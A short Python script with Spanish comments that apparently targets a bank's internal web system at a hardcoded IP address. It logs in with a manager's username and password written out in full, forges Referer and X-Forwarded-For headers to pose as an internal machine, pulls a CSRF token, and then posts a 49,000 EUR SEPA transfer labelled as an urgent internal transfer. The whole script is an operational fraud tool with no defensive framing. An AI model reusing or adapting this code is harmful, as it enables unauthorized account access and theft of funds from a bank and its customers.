import requests

# IP interna del banco
login_page_url = "http://80.78.30.242:9181"

# Datos del gerente
username = "markmur88"
password = "Ptf8454Jd55"

# Headers que simulan una pc interna del gerente
headers = {
    "Host": "80.78.30.242:9181",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0; es-ES) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Origin-IP": "192.168.x.x",  # IP interna del sistema del banco
    "X-Forwarded-For": "192.168.x.x",
    "X-Geo-Location": "40.4074,3.6915",  # Madrid, por ejemplo
    "Referer": "https://80.78.30.242:9181",  # Falsifico referer
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://80.78.30.242:9181"
}

# --- Sesión simulada ---
session = requests.Session()
session.headers.update(headers)

# --- Paso 1: Cargar página interna para obtener token CSRF ---
response = session.get(login_page_url)

# Buscamos tokens CSRF en cookies o dentro del HTML
csrftoken = session.cookies.get("csrftoken")
print("Cookies iniciales:", session.cookies.get_dict())

if not csrftoken:
    # Buscamos token oculto en el HTML del login
    from bs4 import BeautifulSoup

    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find("input", {"name": "csrfmiddlewaretoken"})
    if csrf_input:
        csrftoken = csrf_input.get("value")
        print("[+] Token CSRF obtenido del HTML:", csrftoken)

if csrftoken:
    # --- Paso 2: Login con CSRF token ---
    payload = {
        "username": username,
        "password": password,
        "csrfmiddlewaretoken": csrftoken
    }

    session.headers.update({
        "Referer": login_page_url,  # A veces lo validan
        "Content-Type": "application/x-www-form-urlencoded",
    })

    login_response = session.post(login_page_url, data=payload)

    if login_response.status_code in [200, 302]:
        print("[+] ¡Login exitoso o redirección interna!")
        print("Cookies después del login:", session.cookies.get_dict())

        # --- Paso 3: Usar la sesión para hacer una transferencia ---
        transfer_url = "https://80.78.30.242:9181/api/transferencia"

        transfer_data = {
            "iban_source": "ES12345678901234567890",
            "iban_destination": "ES98765432109876543210",
            "amount": "49000.00",
            "currency": "EUR",
            "reason": "Transferencia interna urgente",
            "csrfmiddlewaretoken": csrftoken
        }

        transfer_response = session.post(transfer_url, data=transfer_data)

        print("\n[+] Respuesta de transferencia SEPA:")
        print("Status:", transfer_response.status_code)
        print("Body:", transfer_response.text[:1000])

    else:
        print("[-] Login fallido. Status:", login_response.status_code)
        print("Respuesta del login:", login_response.text[:1000])

else:
    print("[-] No se logró obtener CSRF token. Probablemente requiere cookie de sesión activa o el endpoint no es el login directo.")
